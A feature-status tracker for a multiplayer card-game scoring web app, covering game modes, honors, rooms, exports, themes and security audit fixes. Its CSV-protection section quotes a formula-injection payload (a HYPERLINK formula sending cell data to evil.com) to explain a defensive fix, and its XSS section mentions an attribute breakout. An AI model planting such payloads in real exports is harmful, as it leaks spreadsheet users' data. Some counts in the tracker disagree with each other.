# Feature Status Tracker

## Project Status

**Phase**: Production + Active Development
**Last Updated**: 2026-05-06 (Phase 2.6 sidebar polish + achievement toast notifications shipped)
**Architecture**: 40 ES6 modules + 10 player APIs + 7 room APIs + 4 themes + visual regression CI (65 baselines)
**Version**: v10.0

---

## Completed Features

### Core Architecture (100%)
- [x] Modular refactoring: 38 ES6 modules with clean separation
- [x] Controller pattern: 5 specialized controllers
- [x] main.js optimization: 1,607 → 509 lines (-69%)
- [x] Vite build system with HMR development
- [x] UTF-8 support for Chinese characters
- [x] State management with pub/sub events
- [x] Fresh localStorage keys (`gd_v9_*`)

### v10.0 New Features (100%)
- [x] Room Browser with player filtering
- [x] Profile photo upload system (base64, auto-resize)
- [x] Enhanced partner/rival bar charts (Chart.js)
- [x] Modern pill-style navigation tabs
- [x] Admin mode — ADMIN_TOKEN env var (constant-time validate); previous hardcoded password rotated out 2026-05
- [x] Server-side timer tracking (finishedAt timestamps)
- [x] MVP photos in victory modal and PNG export
- [x] Viewer voting winner display
- [x] Voting system enhancements (idempotent, all-player sync)

### Game Modes (100%)
- [x] 4-player mode with fixed upgrade table
- [x] 6-player mode with point-based thresholds
- [x] 8-player mode with sweep bonus
- [x] Level progression: 2→3→4→5→6→7→8→9→10→J→Q→K→A
- [x] A-level rules (strict/lenient modes)
- [x] **A-fail counter / demotion** — 4-player only since 2026-05; 6/8 modes simplified to "keep playing until win at own A"
- [x] Configurable scoring rules

### Player System (100%)
- [x] 77+ emoji avatars (animals + food)
- [x] Bulk name input (space-separated)
- [x] Quick start presets for all modes
- [x] Drag-drop team assignment (desktop)
- [x] Touch drag-drop (mobile, 200ms long-press)
- [x] Smart reset (preserve players, clear game)

### Honor System (100%)
14 data-driven honors with clickable explanations:
- [x] 吕布 - First place ratio with reliability threshold
- [x] 阿斗 - Last place ratio with consecutive penalty
- [x] 石佛 - Excellence + stability (top 25%, low variance)
- [x] 波动王 - High variance + extreme range bonus
- [x] 奋斗王 - Progressive improvement (3-segment trend)
- [x] 辅助王 - Team support in bottom-half during wins
- [x] 翻车王 - Dramatic drops (top 3 to last)
- [x] 赌徒 - High risk/reward (high first + high last)
- [x] 大满贯 - Experience all ranking positions
- [x] 连胜王 - Longest consecutive top-half streak
- [x] 佛系玩家 - Closest to median ranking
- [x] 守门员 - Prevent last place during team losses
- [x] 慢热王 - Poor start but strong finish
- [x] 闪电侠 - Most frequent position changes

### Real-Time Rooms (100%)
- [x] 6-digit room codes (A1B2C3 format)
- [x] Host authentication — server-issued tokens, Bearer header validation, TOFU for legacy rooms (since 2026-05)
- [x] Auto-sync every 10 seconds (host)
- [x] Viewer polling every 5 seconds
- [x] State recovery on page refresh
- [x] Host/viewer mode distinction

### Favorites System (100%)
- [x] Room favoriting with 1-year TTL
- [x] Favorites browser modal
- [x] Quick access to saved rooms

### Voting System (100%)
- [x] Anonymous viewer voting for MVP/burden
- [x] Live vote counting (1s updates)
- [x] Host confirmation flow
- [x] "人民的声音" results panel
- [x] Vote reset after confirmation

### Export System (100%)
- [x] TXT export with full history
- [x] CSV export for spreadsheets
- [x] Desktop PNG (wide format)
- [x] Mobile PNG (600px, optimized)
- [x] All 14 honors in exports
- [x] Theme-aware PNG palette (2026-05-05) — exports use the active theme's CSS custom properties

### Visual Regression CI (100%) 🆕
- [x] `npm run test:visual` runs pixelmatch against 65 baseline PNGs across 7 capture scripts
- [x] Coverage: 4 themes (broadcast / linear / trading / atelier) + victory-modal cross-theme + PNG-export + sparklines
- [x] Deterministic captures via `scripts/visual/_fixtures.mjs` (`freezeTime` + `setDeterministicPlayers` + `setDeterministicPlayerStats` + event re-render)
- [x] Sparkline determinism via `FIXED_RANKINGS_8` matrix state-injection (replaces unseedable `#randomRanking` flow; 2026-05-05 `c6da03a`)
- [x] Per-directory threshold overrides in `diff-baselines.mjs` for canvas-rendered PNG exports (font subpixel-rendering noise; 2026-05-05 `f768ba7`)
- [x] GitHub Actions workflow on PR (`.github/workflows/visual-regression.yml`)
- [x] Diff PNGs (red overlay) auto-uploaded as PR artifacts on failure

### Cross-Page Theme Bootstrap (100%) 🆕
- [x] Inline synchronous `<script>` block in <head> of all 4 entry HTMLs (index/players/player-profile/rooms) reads `gd_v9_theme` from localStorage and sets `data-theme` BEFORE stylesheet cascade resolves
- [x] Eliminates the FOUC where saved non-default themes flashed Broadcast on every page navigation
- [x] `themeBootstrap.js` module deleted — was loaded as `<script type="module">` (deferred), ran AFTER stylesheets, caused the FOUC
- [x] Test script `scripts/visual/test-cross-page-theme.mjs` verifies 17 cases (3 themes × 4 pages + default fallback + invalid-payload rejection)
- [x] Adding a new theme requires ONE line edit per HTML in the validation array (`['broadcast','linear','trading','atelier']`) + one stylesheet `<link>` per HTML — same maintenance shape as existing per-page theme link list

### XSS Hardening (100%) 🆕
- [x] `escapeHtml()` from `core/utils.js` now applied uniformly to all player-data render sites (2026-05-05 `0bf1b90`)
- [x] Coverage extended to: `player/photoRenderer.js`, `stats/statistics.js`, `ui/panelManager.js`, `share/votingManager.js` (~36 sites)
- [x] Defense covers both content interpolation AND attribute-context (e.g., `alt="${player.displayName}"` breakout via injected `">`)
- [x] Verified by visual regression — 65/65 baselines pass with zero pixel diff (escaping CJK + emoji is byte-identical)
- See `docs/SECURITY.md` for the complete escape convention + threat model

### Phase 2.5 — Linear Sidebar Layout (100%) 🆕
- [x] `themeManager.mount()` now unmounts the previous theme's layout before swapping — prevents DOM leak when switching from Linear (sidebar) → Broadcast/Trading/Atelier
- [x] `linear/index.js` ships a real `layout.mount/unmount` that moves the live `<nav class="topnav">` into a new `<aside class="linear-sidebar">` wrapper (move-not-clone preserves event listeners + the `#themePickerMount` slot)
- [x] CSS-only mobile fallback: `display: contents` on the sidebar wrapper at `@media (max-width: 768px)` — children render in normal flow, topnav reverts to default sticky-top row, no JS resize listener needed
- [x] `linear/featureManifest.js` declares `navigation: 'sidebar'`
- [x] State preservation is structural — `state.js` singleton survives DOM mutations; the architecture-doc `getSnapshot/restore` pseudocode was illustrative, not literal
- [x] 20-assertion smoke test `scripts/visual/test-theme-switch.mjs` verifies mount + unmount + remount + state-survival across 4-theme cycle (broadcast → trading → atelier → linear)
- [x] VR baselines regenerated for Linear desktop (sidebar visible in `phase2-linear/*.png`)
- See `docs/design/THEME-ARCHITECTURE.md` Section 7 row "2.5" for full implementation notes

### Phase 2.6 — Linear Sidebar Polish (100%) 🆕
- [x] Section label "导航 NAVIGATION" injected before tabs at mount, stripped at unmount (uppercase mono, ink-dimmer, letter-spaced — matches `demos/demo-linear-v2.png` section-label treatment)
- [x] Active-tab accent bar — 2px purple vertical line on the left edge of the active sidebar item via `::before` pseudo (no DOM mutation needed)
- [x] User-card status dot — small green online indicator anchored to bottom-right of the avatar; injected at mount, stripped at unmount
- [x] Mobile (<769px) hides both injected nodes via `display: none`; sidebar reverts to Phase 2.5 mobile fallback (`display: contents`, default topnav row)
- [x] `layout.unmount()` strips injections BEFORE restoring topnav so the original DOM is byte-identical to pre-mount state
- [x] Decorative ⌘1/⌘2/⌘3 shortcut chips were considered and rejected — Cmd+1/2/3 are browser-reserved, so non-functional chips would be aspirational lying
- [x] 20-assertion smoke test still passes (mount + unmount + remount + 4-theme cycle)
- [x] Phase 5 (Tea-Table) is now the only outstanding theme item

### Achievement Toast Notifications (100%) 🆕
- [x] `src/ui/toast.js` (new module) — generic stack-based toast manager: max 3 visible, queue overflow, auto-dismiss 5s, click-to-dismiss
- [x] Theme-agnostic via TOKEN_SPEC vars (`--surface`, `--accent`, `--rule`, `--ink*`) — every theme inherits without per-theme rules
- [x] XSS-safe by construction — createElement + textContent only, no innerHTML (project security hook caught and forced rewrite of the original draft)
- [x] `syncProfileStats` consumes server-returned `result.newAchievements` per player and stages a toast per unlock with 600ms stagger
- [x] Mobile fallback: top-center full-width strip, smaller badge + text size
- [x] Verified end-to-end: build clean, 65/65 VR baselines passing, smoke-tested in Broadcast and Linear themes, mobile rendering verified at 390x844
- [x] Server-side `displayName` length cap (40 chars) added in `api/players/_utils.js` to prevent toast layout abuse via long names

### CSV Formula-Injection Protection (100%) 🆕
- [x] `csvEscape` in `src/export/exportHandlers.js` prefixes formula-trigger cells (`=`, `+`, `-`, `@`, `\t`, `\r`) with single quote — OWASP-recommended approach (2026-05-05 `86d2813`)
- [x] Closes vector where a malicious `displayName` like `=HYPERLINK("//evil.com/?x="&A1,"Click")` would execute as a live formula when teammates open the CSV in Excel / Numbers / LibreOffice
- [x] Single chokepoint: every cell in every row + header passes through `csvEscape` (data + team-name config values both covered)
- [x] Verified by 14-case standalone test (formula triggers, RFC 4180 quoting, plain text + CJK + emoji byte-identical)
- [x] TXT export untouched (`text/plain` Blob — no spreadsheet parser); PNG export untouched (`ctx.fillText` — no HTML parse)
- See `docs/SECURITY.md` `## CSV protections` for full mitigation rationale

---

## Player Profile System (100%) 🆕

**Status**: ✅ Complete and Production-Ready
**Implemented**: 2025-12-10
**Commits**: 30 | **Code**: ~5,000 lines

See [PLAYER_PROFILE_ARCHITECTURE.md](./architecture/PLAYER_PROFILE_ARCHITECTURE.md) for complete technical documentation.

### Core Features
- [x] Player profiles with unique handles (@username)
- [x] Dual stat tracking (sessions + rounds)
- [x] Time tracking (total, longest, average)
- [x] Career stats with session history
- [x] Honor collection (all 14 honors synced)
- [x] Achievement system (20 badges auto-unlock)
- [x] Game history with room links
- [x] Player browser (`/players.html`)
- [x] Individual profile pages (`/player-profile.html`)
- [x] Player search in game setup
- [x] Create player modal
- [x] Remove player functionality
- [x] Smart quick start (recent players)
- [x] MVP tagline on victory screen
- [x] MVP tagline in mobile PNG export
- [x] Session duration tracking and display
- [x] Community voting integration
- [x] Auto-sync voting results (5 min)
- [x] Manual voting sync button

### Backend APIs (10 endpoints)
- [x] POST `/api/players/create` - Create profiles
- [x] GET `/api/players/[handle]` - Fetch profiles
- [x] PUT `/api/players/[handle]` - Update stats (with vote-only mode)
- [x] GET `/api/players/list` - Search & pagination
- [x] POST `/api/players/touch` - Update lastActiveAt
- [x] POST `/api/players/delete` - Remove players
- [x] POST `/api/players/reset-stats` - Clear stats

### Deferred to Phase 2
- [ ] Partner/rival statistics
- [ ] Season leaderboards  
- [ ] Room browser with player filter

### Deferred to Phase 3
- [ ] Authentication (claim profiles)
- [ ] Player comparison tool

---

## Technical Debt

### Code Quality
- [ ] Add unit test coverage
- [ ] Consider TypeScript migration
- [ ] Performance optimization for large histories

### Architecture
- [ ] API versioning strategy
- [ ] Client-side caching improvements
- [ ] Error boundary implementation

### Audit follow-ups (2026-05-02 — see `docs/HANDOFF-2026-05-02-audit.md`)

**P0 — unblocks user-facing feature:**
- [x] Per-user ownership tokens for `PROFILE_UPDATE` (shipped 2026-05-03; admin OR Bearer-token auth, see `docs/SECURITY.md`)
- [x] 3-tier auth gate on stats-update PUT path (CRITICAL, shipped 2026-05-03; admin OR owner Bearer OR room-host Bearer + player-membership check)

**P1 — security (shipped 2026-05-03):**
- [x] Server-side vote count fetch — stats path overrides client `mvpVoteCount`/`burdenVoteCount` with `room.endGameVotes` authoritative values
- [x] `fingerprints` array capped at 1000 entries

**P1 — UX/accessibility (shipped 2026-05-03):**
- [x] Modal accessibility — `src/core/modal.js` helper handles Escape, focus trap, body scroll lock, `aria-modal`; both modals wired
- [x] Touch handler orphan-tile guard (`!tile.isConnected → abort drag` inside the long-press timer; full delegation refactor noted but not done — existing dataset guard already handled the listener-leak claim)
- [x] Mode-change always renders ranking area

**P2 — quality (shipped 2026-05-03):**
- [x] `isDevelopment` reads `import.meta.env.DEV`
- [x] Dead achievements removed (`comeback`/`sweep`/`iron_will` deleted; reduced 20→17)
- [x] Honors variance n=1 documented (population variance intentional; small-sample callers must gate)
- [x] `votingManager.js` undefined refs replaced with `getRoomInfo()`

**P3 — drift (shipped 2026-05-03):**
- [x] Poll interval drift reconciled (CLAUDE.md updated to match code's 2000ms)
- [x] MVP/burden tie-breaker extracted to `src/stats/mvpBurden.js`
- [x] `state.js` `getPlayerStats()` returns deep clone
- [x] Token rotation endpoint (`mode: 'ROTATE_TOKEN'`) + edit modal affordance

---

## Performance Metrics

| Metric | Current |
|--------|---------|
| Initial load | <2s (3G) |
| Room sync RTT | <500ms |
| Vote submit | <300ms |
| PNG generation | <3s (50+ rounds) |
| Memory usage | <50MB |

### Capacity (Free Tier)
| Resource | Limit |
|----------|-------|
| Concurrent rooms | 50+ |
| Storage | 256MB (~8,500 rooms) |
| Global latency | <100ms (edge) |
